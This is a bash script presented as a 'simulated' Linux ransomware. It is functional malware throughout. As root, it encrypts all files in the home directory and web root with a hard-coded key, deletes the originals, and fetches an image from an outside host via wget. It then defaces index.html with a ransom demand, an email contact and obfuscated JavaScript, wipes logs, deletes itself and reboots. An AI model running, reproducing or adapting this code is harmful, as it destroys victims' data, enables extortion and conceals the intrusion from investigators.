#!/bin/bash
# Just a simple script i have done to simulate a ransomware in Linux. Not for use ilegally
#

SELF=$(realpath $0)
FOLDERS=("$HOME" "/var/www/html")
# pwgen -ny 2500 # Nothing special, no keys are used
PASS="Eighei3tah0soh5re4nee4aiLeiboiHohceechooj8au7shuaxunea2Aem5noi4ooXee9aeR6Ahfie7aiyiedi5ieSoojaegahko6cip1vew5ofoehah3ieNo9Peung6eev0yae5EitujeeR7eemaHei5Cieph7Koo0aeke5uu0ooyei6EeK5ogh8iugu7zei4hooc5iowii3oLohthaichuu3eathoe4foh4fuoghaeGae9fusai4eilai8seik0geeg4yaugh6aichahchohGooquaovoo0aengefah8eiD7iechaez1cex7oopai5Aech8ahkooshiedai1xeshoshiekoob3ahsheCh3oloa0uavea7ka8iepu7Oi0aibahpa7Ath5chooxohNookohbae3Eme7Ye5aeY8thusae1eenohpoMi3ahnga8wupeac4cai9othae5ahLie1uQuifeuvu6oht2eo1Iel9is7jeegahrid0mah5SooThoh3looViezaghooTeethoophaexohp5cie7pie0cho8Ahchahc2phitahYozabaihohshe5xienola7aechahmi1shohThoonaex7theitahnaiVeXeelahqu6ut2Ahlahpee5uCheephee3aejooreed9Iosheib3uquahg3eiyaith9uuzaicai9eejaingo7Lohqu7ongie2alaChoh1Boh0aiL8deeshieyiepahMei9sohChen1chudoh7ookae2AiqueiB5ve2aesaeyaipheiChooch0ug0chah5aem5iey3uhi8haomiethooYu9ieph8SaiWeinoo0ahneiYa1eipaegaej6quee0caec8johgheeBoogook5xahquuephiiyuithumaeYae6dez6aej5ahDeiPhi8ieZupueph0Iraoch3voithuiwaiG7ahc8dohH8ohwai8teeZ9yie7xaehoch0zee1geicu1kuah4Vinie2zoht9Oyoh2Shaefie2ma7uuG5Phi1iPe0AhCae2ahcaiv6shoixiWai8aixoh0Aeyoo7eMiNe8oadeitiegieboo2tuphooJ9AQu4soh7Iezeo6jahngohFies5aJ6so1zah3ohyugoh1AiJied6eshei8eugoaSe4ahmooBaiphe0za5bith5ashei1ohngiesh1jibohc2ie7oox6jeip9cae5AhchahNgi0aig7oet1ohhuGeeTheeKouWielei7keef4Eghiufoophegi1ievaich2ohS1ohvoo9oomaeleh4oob0pedo3AwauR5Athoh1Uxiexe4Thahdae4Phee4eeR2jeesh8aesieP9eethainae3iulaim8Fee1eiphuu2Chai0phi1ashil1Jaechei9aiTh0aighoe9ahbauGhuK5woo4ighahtioLee5eeXooque6shaehaighahthugha1ooWuuBahp6ec2phaNgouWaiyuu5tieM1ees8ahngahJei6zai9sie7xietaePah3ohJoa8Iohohzoh3ov4aiyahco0Tie8pieyo5uheiJee9onahwei5Eib6ku2iT9Epu5chie1Thohk1Eipieziu1johvieR6pohgoop5Thaeg0leX6aehai3sha1ra9ceeshieThoh1OhY2ub1phooG6ahch2oocha4gamesa2zed5ahv5aiJucata1jaelaishah7sonie4gahchu0chahieZee5diejit5poo0UiChoh1aen1jeiz9feefafe3Iesohwain5ool9Ha8meinoolai5ahn5Ma4Iqu4Yeitiequ6iehePhif6tei2ai7aeghiesui2vaeK1ohwoh0haj8yeeghozoax0phae3oakaeBee8Pei8Aj0oor2EePhoteetoo1aiLohtoojaequoghahz8id5ievaixu2EtoiKeipieP7EeThah0e"

# Print messages
pinfo() {

	echo -e "[+] ${1}"
}

# Check if root
if [ ! $EUID -eq 0 ]; then
	echo "[E] You are not root!"
	exit 1
fi

# Iterate through every file, encrypt and delete original file
for f in "${FOLDERS[@]}"; do
	pinfo "Encrypting $f..."
	for i in $(find ${f} -type f); do
		pinfo "\t$i"
		openssl aes-256-cbc -salt -a -k ${PASS} -e -in $i -out $i.enc; 
		pinfo "Deleting $i"
		rm -f $i
	done
done

# Deface index

#Download or reference an image
#wget 

wget "https://cdn.shopify.com/s/files/1/2234/4465/files/free-assange-banner-130x80_1296x.jpg?v=1555406338" -O /var/www/html/assange.jpg


cat << EOF >> /var/www/html/index.html
<!DOCTYPE html>
<html>
<head><title>test</title>
<style type="text/css">
body {
	background-color: #000000;
		color: #FF0000;
	}
	</style>
	</head>
	<body>
	<img src="/var/www/html/assange.jpg" width="40%" height="40%" />
	<h2>
	Hello<br/>Your host was hacked and encrypted.<br/><br/>No free decryption software is available on the web.<br/>Email us at muhammadb@protonmail.com to get the ransom amount.<br/>Keep our contact safe. Disclosure can lead to impossibility of decryption.<br/>Please, use your company name as the email subject.<br/></h2>
	<br/>Time left: 
	<p id="timer"></p>
	<script>
	var _0x4260=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x59\x32\x68\x68\x61\x57\x34\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x6d\x56\x30\x64\x58\x4a\x75\x49\x43\x68\x6d\x64\x57\x35\x6a\x64\x47\x6c\x76\x62\x69\x67\x70\x49\x41\x3d\x3d','\x65\x33\x30\x75\x59\x32\x39\x75\x63\x33\x52\x79\x64\x57\x4e\x30\x62\x33\x49\x6f\x49\x6e\x4a\x6c\x64\x48\x56\x79\x62\x69\x42\x30\x61\x47\x6c\x7a\x49\x69\x6b\x6f\x49\x43\x6b\x3d','\x59\x32\x39\x75\x63\x32\x39\x73\x5a\x51\x3d\x3d','\x62\x47\x39\x6e','\x64\x32\x46\x79\x62\x67\x3d\x3d','\x5a\x47\x56\x69\x64\x57\x63\x3d','\x61\x57\x35\x6d\x62\x77\x3d\x3d','\x5a\x58\x4a\x79\x62\x33\x49\x3d','\x5a\x58\x68\x6a\x5a\x58\x42\x30\x61\x57\x39\x75','\x64\x48\x4a\x68\x59\x32\x55\x3d','\x54\x57\x46\x35\x49\x44\x63\x67\x4d\x6a\x41\x78\x4f\x53\x41\x78\x4d\x44\x6f\x7a\x4e\x54\x6f\x7a\x4e\x51\x3d\x3d','\x5a\x32\x56\x30\x56\x47\x6c\x74\x5a\x51\x3d\x3d','\x5a\x6d\x78\x76\x62\x33\x49\x3d','\x5a\x32\x56\x30\x52\x57\x78\x6c\x62\x57\x56\x75\x64\x45\x4a\x35\x53\x57\x51\x3d','\x64\x47\x6c\x74\x5a\x58\x49\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x56\x45\x31\x4d','\x52\x56\x68\x51\x53\x56\x4a\x46\x52\x41\x3d\x3d','\x63\x33\x52\x79\x61\x57\x35\x6e','\x59\x32\x39\x75\x63\x33\x52\x79\x64\x57\x4e\x30\x62\x33\x49\x3d','\x64\x32\x68\x70\x62\x47\x55\x67\x4b\x48\x52\x79\x64\x57\x55\x70\x49\x48\x74\x39','\x59\x32\x39\x31\x62\x6e\x52\x6c\x63\x67\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x5a\x47\x56\x69\x64\x51\x3d\x3d','\x5a\x32\x64\x6c\x63\x67\x3d\x3d','\x59\x32\x46\x73\x62\x41\x3d\x3d','\x59\x57\x4e\x30\x61\x57\x39\x75','\x63\x33\x52\x68\x64\x47\x56\x50\x59\x6d\x70\x6c\x59\x33\x51\x3d','\x59\x58\x42\x77\x62\x48\x6b\x3d','\x5a\x6e\x56\x75\x59\x33\x52\x70\x62\x32\x34\x67\x4b\x6c\x77\x6f\x49\x43\x70\x63\x4b\x51\x3d\x3d','\x58\x43\x74\x63\x4b\x79\x41\x71\x4b\x44\x38\x36\x58\x7a\x42\x34\x4b\x44\x38\x36\x57\x32\x45\x74\x5a\x6a\x41\x74\x4f\x56\x30\x70\x65\x7a\x51\x73\x4e\x6e\x31\x38\x4b\x44\x38\x36\x58\x47\x4a\x38\x58\x47\x51\x70\x57\x32\x45\x74\x65\x6a\x41\x74\x4f\x56\x31\x37\x4d\x53\x77\x30\x66\x53\x67\x2f\x4f\x6c\x78\x69\x66\x46\x78\x6b\x4b\x53\x6b\x3d','\x61\x57\x35\x70\x64\x41\x3d\x3d'];(function(_0x193b95,_0x51f2a1){var _0x442f7a=function(_0x50020a){while(--_0x50020a){_0x193b95['push'](_0x193b95['shift']());}};_0x442f7a(++_0x51f2a1);}(_0x4260,0x12e));var _0x586d=function(_0x3b544d,_0x114d39){_0x3b544d=_0x3b544d-0x0;var _0x3f4925=_0x4260[_0x3b544d];if(_0x586d['ckAMbe']===undefined){(function(){var _0x2244d4=function(){var _0x250b08;try{_0x250b08=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x170d5d){_0x250b08=window;}return _0x250b08;};var _0x1e25f8=_0x2244d4();var _0x4dc5ea='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1e25f8['atob']||(_0x1e25f8['atob']=function(_0x2d64bc){var _0x591f45=String(_0x2d64bc)['replace'](/=+$/,'');for(var _0xdfe7a0=0x0,_0x2ec16c,_0x3e511b,_0x49cdde=0x0,_0xbf17f9='';_0x3e511b=_0x591f45['charAt'](_0x49cdde++);~_0x3e511b&&(_0x2ec16c=_0xdfe7a0%0x4?_0x2ec16c*0x40+_0x3e511b:_0x3e511b,_0xdfe7a0++%0x4)?_0xbf17f9+=String['fromCharCode'](0xff&_0x2ec16c>>(-0x2*_0xdfe7a0&0x6)):0x0){_0x3e511b=_0x4dc5ea['indexOf'](_0x3e511b);}return _0xbf17f9;});}());_0x586d['ZEPyZT']=function(_0x3d1898){var _0xdc6e6c=atob(_0x3d1898);var _0x44fd95=[];for(var _0x48584a=0x0,_0x5e6122=_0xdc6e6c['length'];_0x48584a<_0x5e6122;_0x48584a++){_0x44fd95+='%'+('00'+_0xdc6e6c['charCodeAt'](_0x48584a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x44fd95);};_0x586d['cOgqLQ']={};_0x586d['ckAMbe']=!![];}var _0x28d3df=_0x586d['cOgqLQ'][_0x3b544d];if(_0x28d3df===undefined){_0x3f4925=_0x586d['ZEPyZT'](_0x3f4925);_0x586d['cOgqLQ'][_0x3b544d]=_0x3f4925;}else{_0x3f4925=_0x28d3df;}return _0x3f4925;};var _0x188acb=function(){var _0x3194ca=!![];return function(_0x490b18,_0x22469a){var _0x1eec32=_0x3194ca?function(){if(_0x22469a){var _0x3604f3=_0x22469a[_0x586d('0x0')](_0x490b18,arguments);_0x22469a=null;return _0x3604f3;}}:function(){};_0x3194ca=![];return _0x1eec32;};}();(function(){_0x188acb(this,function(){var _0x57cdbe=new RegExp(_0x586d('0x1'));var _0x4c59e5=new RegExp(_0x586d('0x2'),'\x69');var _0x1103f0=_0x3ffc87(_0x586d('0x3'));if(!_0x57cdbe[_0x586d('0x4')](_0x1103f0+_0x586d('0x5'))||!_0x4c59e5[_0x586d('0x4')](_0x1103f0+_0x586d('0x6'))){_0x1103f0('\x30');}else{_0x3ffc87();}})();}());var _0x589048=function(){var _0x3830e0=!![];return function(_0x138277,_0x55bcdf){var _0x3a31ca=_0x3830e0?function(){if(_0x55bcdf){var _0x430cad=_0x55bcdf[_0x586d('0x0')](_0x138277,arguments);_0x55bcdf=null;return _0x430cad;}}:function(){};_0x3830e0=![];return _0x3a31ca;};}();var _0x3d3013=_0x589048(this,function(){var _0xc4cb5e=function(){};var _0x436a2e;try{var _0x326295=Function(_0x586d('0x7')+_0x586d('0x8')+'\x29\x3b');_0x436a2e=_0x326295();}catch(_0x311786){_0x436a2e=window;}if(!_0x436a2e[_0x586d('0x9')]){_0x436a2e[_0x586d('0x9')]=function(_0xc4cb5e){var _0xdca334={};_0xdca334[_0x586d('0xa')]=_0xc4cb5e;_0xdca334[_0x586d('0xb')]=_0xc4cb5e;_0xdca334[_0x586d('0xc')]=_0xc4cb5e;_0xdca334[_0x586d('0xd')]=_0xc4cb5e;_0xdca334[_0x586d('0xe')]=_0xc4cb5e;_0xdca334[_0x586d('0xf')]=_0xc4cb5e;_0xdca334[_0x586d('0x10')]=_0xc4cb5e;return _0xdca334;}(_0xc4cb5e);}else{_0x436a2e[_0x586d('0x9')][_0x586d('0xa')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0xb')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0xc')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0xd')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0xe')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0xf')]=_0xc4cb5e;_0x436a2e[_0x586d('0x9')][_0x586d('0x10')]=_0xc4cb5e;}});_0x3d3013();var _0xc747ae=new Date(_0x586d('0x11'))[_0x586d('0x12')]();var _0x1ca843=setInterval(function(){var _0xf7913c=new Date()[_0x586d('0x12')]();var _0x336b69=_0xc747ae-_0xf7913c;var _0x53877c=Math[_0x586d('0x13')](_0x336b69%(0x3e8*0x3c*0x3c*0x18)/(0x3e8*0x3c*0x3c));var _0x10f33b=Math[_0x586d('0x13')](_0x336b69%(0x3e8*0x3c*0x3c)/(0x3e8*0x3c));var _0x1c49df=Math[_0x586d('0x13')](_0x336b69%(0x3e8*0x3c)/0x3e8);document[_0x586d('0x14')](_0x586d('0x15'))[_0x586d('0x16')]=_0x53877c+'\x68\x20'+_0x10f33b+'\x6d\x20'+_0x1c49df+'\x73\x20';if(_0x336b69<0x0){clearInterval(_0x1ca843);document[_0x586d('0x14')](_0x586d('0x15'))[_0x586d('0x16')]=_0x586d('0x17');}},0x3e8);function _0x3ffc87(_0xca65e){function _0x5135a1(_0x52c6b9){if(typeof _0x52c6b9===_0x586d('0x18')){return function(_0x423067){}[_0x586d('0x19')](_0x586d('0x1a'))[_0x586d('0x0')](_0x586d('0x1b'));}else{if((''+_0x52c6b9/_0x52c6b9)[_0x586d('0x1c')]!==0x1||_0x52c6b9%0x14===0x0){(function(){return!![];}[_0x586d('0x19')](_0x586d('0x1d')+_0x586d('0x1e'))[_0x586d('0x1f')](_0x586d('0x20')));}else{(function(){return![];}[_0x586d('0x19')](_0x586d('0x1d')+_0x586d('0x1e'))[_0x586d('0x0')](_0x586d('0x21')));}}_0x5135a1(++_0x52c6b9);}try{if(_0xca65e){return _0x5135a1;}else{_0x5135a1(0x0);}}catch(_0x35c45a){}}
</script></body></html>
EOF


# delete logs
rm -rf /var/logs/*

# Change root's pass
# pwgen -ny 25
pinfo "[!] Change root's pass. 15 seconds"
sleep 15


# Delete evidence
rm -f $SELF
pinfo DONE!

# Reboot
pinfo "C'ya!"
shutdown -r +0
